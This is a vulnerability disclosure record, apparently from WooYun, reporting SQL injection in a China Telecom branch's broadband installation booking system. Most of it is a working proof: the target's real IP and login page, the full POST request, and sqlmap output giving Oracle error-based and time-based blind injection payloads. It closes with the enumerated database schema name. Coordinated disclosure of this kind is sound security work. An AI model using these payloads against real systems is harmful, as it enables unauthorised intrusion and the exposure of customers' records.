wybug_title: 中国电信某系统sql注入(泄露市级详单)
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-05-24：	细节已通知厂商并且等待厂商处理中									2015-05-28：	厂商已经确认，细节仅向厂商公开									2015-06-07：	细节向核心白帽子及相关领域专家公开									2015-06-17：	细节向普通白帽子公开									2015-06-27：	细节向实习白帽子公开									2015-07-12：	细节向公众公开  简要描述： 中国电信运营安全服务中心 详细说明：  @某市电信宽带装机预约系统sql注入(泄露全市宽带安装单)   漏洞证明：  http://222.86.132.2/login.asp安顺电信分公司宽带装机预约系统post数据：POST /chklogin.asp HTTP/1.0Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/QVOD, application/QVOD, */*Referer: http://222.86.132.2/Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 222.86.132.2Content-Length: 34Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASPSESSIONIDAATSACBD=LMLJNIEAMAJEOGCFDMILIMJCadmin=1&password=1&B1=%CC%E1%BD%BB注入数据：sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: admin (POST)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: admin=1' AND 5607=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5607=5607) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(98)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND 'Zthk'='Zthk&password=1&B1=%CC%E1%BD%BB    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: admin=1' AND 8984=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'JeHd'='JeHd&password=1&B1=%CC%E1%BD%BB---[23:14:00] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Oracle[23:14:00] [INFO] fetching current database[23:14:00] [INFO] resumed: GZDXDB[23:14:00] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'GZDXDB'[23:14:00] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\222.86.132.2'[*] shutting down at 23:14:00
